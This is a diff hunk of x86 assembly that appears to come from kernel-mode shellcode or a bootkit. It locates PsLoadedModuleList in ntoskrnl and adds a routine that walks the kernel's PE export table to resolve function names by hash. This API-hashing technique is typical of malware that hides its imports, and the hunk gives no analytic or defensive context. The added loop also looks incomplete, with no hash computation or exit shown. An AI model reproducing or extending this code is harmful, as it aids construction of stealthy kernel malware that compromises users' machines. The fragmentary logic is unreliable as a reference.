@@ -627,6 +627,36 @@ dec edi  ; found the code signature, extract PsLoadedModuleList
 mov eax,[edi+0x4]    ; store PsLoadedModuleList pointer in eax 
 
 Image_Parsing_done:
+; use Export Table of the PE Image to resolve the hashes
+mov edx,[edx+0x78]   ; -> Export Table.Virtual Address
+add edx,ebx ; ebx = pointer to DOS Header / image base  (absolute address)
+xor ecx,ecx
+dec ecx  ; ecx = -1 = 0FFFFFFFFh
+
+; store the PsLoadedModuleList pointer on stack and resolve hashes
+jmp short Resolve_Next_Hash_StoreOnStack
+
+Next_Export:
+;  ecx      export counter
+;  ebx      still base of ntoskrnl image (points to DOS Header)
+;  esi      Export Name
+;  edi      Hash Value
+;  [esp]    Pointer to Next Hash
+;  ebp      Pointer to Stack Variables
+inc ecx   ; next function to generate hash of (ecx = counter)
+mov esi,[edx+0x20] ; Export Directory Table.Name Pointer RVA
+add esi,ebx    ;  (absolute address)
+mov esi,[esi+ecx*4]   ; lookup the function name in the Name Pointer Table
+add esi,ebx     ;  (absolute address)
+
+xor eax,eax   ; will hold character (zero extended)
+xor edi,edi   ; will hold hash value
+
+Resolve_Next_Hash_StoreOnStack:
+xchg edi,ebp    ; edi to point to stack variables
+stosd   ; store eax to variable
+xchg edi,ebp  ; ebp points now to next variable...!
+jmp short Next_Export
 
 ;mov esp,ebp 
 popfd
